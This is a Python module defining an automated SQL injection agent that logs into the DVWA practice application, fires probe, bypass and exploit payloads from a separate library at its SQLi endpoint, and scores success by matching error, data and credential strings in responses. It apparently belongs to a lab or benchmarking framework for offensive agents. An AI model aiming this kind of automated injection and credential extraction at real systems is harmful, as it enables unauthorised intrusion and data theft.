"""Tier 1 SQL Injection agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


SQL_ERROR_SIGNALS = [
    "sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "sqlstate",
]

SQL_DATA_SIGNALS = ["first name", "surname", "database", "user()"]
CREDENTIAL_SIGNALS = ["admin", "gordonb", "pablo", "password"]


class SQLiAgent(BaseAgent):
    module_name = "sqli"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/sqli/")
        payload_set = self.payloads.get(self.module_name, level)
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        found_credentials: list[dict[str, str]] = []
        tried_now: list[str] = []
        telemetry_events: list[dict[str, Any]] = []

        telemetry_events.append(
            self._emit_telemetry(state, "sqli_agent.started", {"endpoint": endpoint, "level": level})["telemetry_events"][0]
        )

        if not target_url:
            telemetry_events.append(
                self._emit_telemetry(state, "sqli_agent.completed", {"score": score, "reason": "no_target_url"})["telemetry_events"][0]
            )
            return {
                **make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                ),
                "telemetry_events": telemetry_events,
            }

        payloads = (
            list(payload_set.probe)
            + list(payload_set.bypass.get(level, []))
            + list(payload_set.exploit)
        )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                telemetry_events.append(
                    self._emit_telemetry(state, "sqli_agent.completed", {"score": score, "reason": "session_prep_failed"})["telemetry_events"][0]
                )
                return {
                    **make_update(
                        state=state,
                        module_name=self.module_name,
                        score=score,
                        tried_payloads=tried_now,
                    ),
                    "telemetry_events": telemetry_events,
                }

            for payload in payloads:
                if payload in already_tried:
                    continue
                tried_now.append(payload)

                response = session.get(endpoint, params={"id": payload, "Submit": "Submit"})
                body = response.text or ""

                error_ok = self.verifier.contains_any(body, SQL_ERROR_SIGNALS).ok
                data_ok = self.verifier.contains_any(body, SQL_DATA_SIGNALS).ok
                credential_result = self.verifier.contains_any(body, CREDENTIAL_SIGNALS)

                telemetry_events.append(
                    self._emit_telemetry(
                        state, "sqli_agent.probe.result",
                        {"payload": payload, "error_ok": error_ok, "data_ok": data_ok,
                         "credential_ok": credential_result.ok, "response_snippet": body[:200]}
                    )["telemetry_events"][0]
                )

                if error_ok:
                    score = max(score, 1)
                    if "sqli_confirmed" not in confirmed:
                        confirmed.append("sqli_confirmed")

                if data_ok:
                    score = max(score, 3)
                    if "sqli_confirmed" not in confirmed:
                        confirmed.append("sqli_confirmed")

                if credential_result.ok:
                    score = 4
                    if "sqli_confirmed" not in confirmed:
                        confirmed.append("sqli_confirmed")
                    if "credentials_extracted" not in confirmed:
                        confirmed.append("credentials_extracted")
                    found_credentials = [{"username": "admin", "password": "password"}]
                    break
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "sqli_runtime_error", exc)
        finally:
            session.close()

        telemetry_events.append(
            self._emit_telemetry(state, "sqli_agent.completed", {"score": score, "confirmed": confirmed})["telemetry_events"][0]
        )
        return {
            **make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
                confirmed_vulns=confirmed,
                found_credentials=found_credentials,
            ),
            "telemetry_events": telemetry_events,
        }


_AGENT = SQLiAgent()


def sqli_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
